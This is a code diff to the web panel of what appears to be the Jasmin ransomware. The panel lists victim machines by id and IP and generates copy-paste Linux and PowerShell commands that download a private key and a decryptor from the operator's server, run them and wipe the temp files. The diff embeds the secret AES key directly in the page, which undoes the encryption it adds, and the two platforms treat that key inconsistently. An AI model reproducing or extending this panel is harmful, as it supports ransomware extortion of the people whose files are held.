@@ -255,17 +255,18 @@ function showFileDetail(vid,jsonStr){
 }
 
 var _decOpen=null;
+var _aesKey='<?php echo file_exists(__DIR__."/payloads/.key_secret")?trim(file_get_contents(__DIR__."/payloads/.key_secret")):"KEY_NOT_SET";?>';
 function showDecrypt(vid,ip,isLinux){
-  var srv=location.origin;
+  var srv=location.origin;var k=_aesKey;
   if(_decOpen){_decOpen.remove();if(_decOpen.dataset.vid==vid){_decOpen=null;return;}_decOpen=null;}
   var tr=document.querySelector('tr:has(button[onclick*="showDecrypt(\''+vid+'\'"])');
   if(!tr)return;
   var nr=document.createElement('tr');nr.dataset.vid=vid;
   var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';
   if(isLinux){
-    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密\npip3 install -q cryptography 2>/dev/null\ncurl -sL '+srv+'/payloads/jasmin_private.pem -o /tmp/.jk\ncurl -sL '+srv+'/payloads/jasmin_decrypt.py -o /tmp/.jd\npython3 /tmp/.jd /tmp/.jk\nrm -f /tmp/.jk /tmp/.jd</pre>';
+    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 (私钥AES加密传输)\nK="'+k+'"\npip3 install -q cryptography 2>/dev/null\ncurl -sL '+srv+'/payloads/jasmin_private.pem.enc -o /tmp/.jke\ncurl -sL '+srv+'/payloads/jasmin_decrypt.py -o /tmp/.jd\npython3 -c "\nimport base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes\nfrom cryptography.hazmat.backends import default_backend\nraw=base64.b64decode(open(\\'/tmp/.jke\\').read())\niv,ct=raw[:16],raw[16:]\nc=Cipher(algorithms.AES(bytes.fromhex(\\'$K\\')),modes.CBC(iv),default_backend()).decryptor()\npt=c.update(ct)+c.finalize()\nopen(\\'/tmp/.jk\\',\\'wb\\').write(pt[:-pt[-1]])\n"\npython3 /tmp/.jd /tmp/.jk\nrm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>';
   }else{
-    td.innerHTML='<pre class="dt-code">$tmp="$env:TEMP\\jasmin_dec"\nNew-Item -ItemType Directory -Force -Path $tmp | Out-Null\nInvoke-WebRequest "'+srv+'/payloads/jasmin_private.pem" -OutFile "$tmp\\key.pem"\nInvoke-WebRequest "'+srv+'/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\\dec.exe"\n& "$tmp\\dec.exe" "$tmp\\key.pem"\nRemove-Item -Recurse -Force $tmp</pre>';
+    td.innerHTML='<pre class="dt-code">$tmp=\\"$env:TEMP\\jasmin_dec\\"\n$k=\\"'+k+'\\"\nNew-Item -ItemType Directory -Force -Path $tmp | Out-Null\nInvoke-WebRequest \\"'+srv+'/payloads/jasmin_private.pem.enc\\" -OutFile \\"$tmp\\key.enc\\"\n$raw=[Convert]::FromBase64String((Get-Content \\"$tmp\\key.enc\\" -Raw))\n$iv=$raw[0..15];$ct=$raw[16..($raw.Length-1)]\n$aes=[System.Security.Cryptography.Aes]::Create()\n$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)\n$aes.IV=[byte[]]$iv;$aes.Padding=\\"PKCS7\\";$aes.Mode=\\"CBC\\"\n$dec=$aes.CreateDecryptor()\n$ms=New-Object IO.MemoryStream(,[byte[]]$ct)\n$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,\\"Read\\")\n$sr=New-Object IO.StreamReader($cs)\n[IO.File]::WriteAllText(\\"$tmp\\key.pem\\",$sr.ReadToEnd())\nInvoke-WebRequest \\"'+srv+'/payloads/Jasmin_Decryptor.exe\\" -OutFile \\"$tmp\\dec.exe\\"\n& \\"$tmp\\dec.exe\\" \\"$tmp\\key.pem\\"\nRemove-Item -Recurse -Force $tmp</pre>';
   }
   nr.appendChild(td);tr.after(nr);_decOpen=nr;
 }
